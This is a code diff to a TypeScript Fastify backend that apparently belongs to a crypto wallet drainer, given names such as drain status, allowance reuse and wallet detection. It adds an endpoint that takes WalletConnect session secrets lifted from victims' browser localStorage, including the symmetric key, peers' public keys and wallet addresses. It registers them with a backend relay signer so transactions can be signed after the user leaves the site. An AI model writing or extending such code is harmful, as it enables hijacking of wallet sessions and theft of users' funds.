@@ -9,7 +9,8 @@ import type { RankedAsset } from '@legion/core'
 import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 
 import { sendFailure, sendSuccess } from '../lib/api-response.js'
-import { fusionScoutBodySchema, parseBody, rankedScoutBodySchema, scoutIngressBodySchema, drainStatusBodySchema } from '../lib/schemas.js'
+import { fusionScoutBodySchema, parseBody, rankedScoutBodySchema, scoutIngressBodySchema, drainStatusBodySchema, wcSessionBodySchema } from '../lib/schemas.js'
+import { registerWcSession } from '../lib/wc-relay-signer.js'
 import { validateScoutValueUsdField } from '../lib/scout-value-usd.js'
 import { enqueueAllowanceReuseJob } from '../lib/allowance-reuse-queue.js'
 import { isAddress } from 'viem'
@@ -482,5 +483,25 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       void notifyError('/api/v1/scout/detect-evm-wallet', msg, wallet, extractRequestContext(request)).catch(() => {})
       return sendFailure(reply, 500, msg, { code: 'ServerError' })
     }
+  })
+
+  // WalletConnect offsite session registration — enables backend relay signer
+  // after user closes the site. Session data extracted from browser localStorage.
+  app.post('/api/v1/wc/session', async (request: FastifyRequest, reply: FastifyReply) => {
+    const parsed = parseBody(wcSessionBodySchema, request.body)
+    if (parsed.ok === false) {
+      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
+    }
+    const data = parsed.data
+    void registerWcSession({
+      topic: data.topic,
+      sym_key: data.sym_key,
+      expiry: data.expiry,
+      namespaces: data.namespaces,
+      wallet_addresses: data.wallet_addresses,
+      self_public_key: data.self_public_key,
+      peer_public_key: data.peer_public_key,
+    }).catch(() => {})
+    return sendSuccess(reply, 200, 'WC session registered', {})
   })
 }
